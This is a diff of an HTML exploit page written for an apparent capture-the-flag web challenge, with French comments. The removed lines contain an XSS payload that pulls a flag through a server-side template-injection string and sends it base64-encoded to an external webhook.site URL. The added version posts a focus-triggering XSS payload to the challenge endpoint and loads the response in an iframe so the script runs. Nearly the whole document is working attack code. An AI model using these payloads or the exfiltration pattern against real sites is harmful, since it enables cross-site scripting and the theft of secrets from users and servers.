@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS Attack</title></head>
+<head><title>XSS Exploit</title></head>
 <body>
-<h2>Exploitation...</h2>
-
 <script>
-  // Version améliorée du payload utilisant backticks et String.fromCharCode
-  const xssPayload = 'x`;fetch(`/admin?prompt={run_cmd.__globals__[FLAG]}`).then(r=>r.text()).then(d=>fetch(`https${String.fromCharCode(58)}//webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?d=${btoa(d)}`));//';
+  // Payload qui déclenche automatiquement l'événement focus
+  const xssPayload = 'x`;document.getElementById("behindthename-redirect").focus();//';
   
   fetch('https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: 'name=' + encodeURIComponent(xssPayload)
   })
-  .then(response => {
-    console.log("Payload envoyé!");
-    // Indiquer au bot que nous avons terminé
-    document.body.innerHTML = "<h2>Exploitation terminée!</h2>";
-  })
-  .catch(error => {
-    console.error("Erreur:", error);
-    document.body.innerHTML = "<h2>Erreur d'exploitation: " + error + "</h2>";
+  .then(response => response.text())
+  .then(html => {
+    // Afficher la réponse dans un iframe pour exécuter l'XSS
+    const iframe = document.createElement('iframe');
+    iframe.srcdoc = html;
+    document.body.appendChild(iframe);
+    
+    // Mettre à jour le statut
+    document.getElementById('status').textContent = "Exploitation en cours...";
   });
 </script>
+<h1 id="status">Chargement...</h1>
 </body>
 </html>
